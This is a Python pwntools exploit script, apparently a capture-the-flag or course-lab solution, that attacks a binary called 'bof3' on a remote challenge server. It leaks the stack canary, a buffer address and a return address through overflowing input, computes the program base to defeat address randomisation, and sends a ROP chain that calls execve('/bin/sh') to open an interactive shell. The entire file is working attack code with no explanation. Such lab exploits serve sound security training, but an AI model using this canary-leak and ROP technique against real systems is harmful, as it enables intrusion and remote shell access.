#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof3'
port = 10261

r = remote('up.zoolab.org', port)

chal_rop = ROP(exe)

mov_addr = 0x3a8e3
rdi_addr = chal_rop.find_gadget(["pop rdi", "ret"]).address
rsi_addr = chal_rop.find_gadget(["pop rsi", "ret"]).address
rdx_addr = chal_rop.find_gadget(["pop rdx", "pop rbx", "ret"]).address
rax_addr = chal_rop.find_gadget(["pop rax", "ret"]).address
syscall_addr = chal_rop.find_gadget(["syscall", "ret"]).address

r.sendafter(b"name? ", flat(asm('nop') * 40))
canary = r.recvuntil(b"Welcome, " + flat(asm('nop') * 40), drop=True)
canary = canary[0] if canary else b'\x00'

payload = flat(asm('nop') * 41)
r.sendafter(b"number? ", payload)
r.recvuntil(b"The room number is: "+flat(asm('nop') * 41))
res = r.recvline()
canary = canary+res[:7]
buf_addr = u64(res[7:-1].ljust(8, b'\x00'))-0x40

payload = flat(asm('nop') * 56)
r.sendafter(b"name? ", payload)
r.recvuntil(b"The customer's name is: "+flat(asm('nop') * 56))
return_addr = u64(r.recvline()[:-1].ljust(8, b'\x00'))

main = return_addr - 0x6C
base_addr = main - 0x8a64

ropc = flat([base_addr + rdi_addr, p64(buf_addr), base_addr+rsi_addr, 0, base_addr + rdx_addr, 0, 0, base_addr + rax_addr, 0x3b, base_addr + syscall_addr])
r.sendafter(b"Leave your message: ", b"/bin/sh".ljust(40, b'\x00') + canary + asm('nop')*8 + ropc)

r.interactive()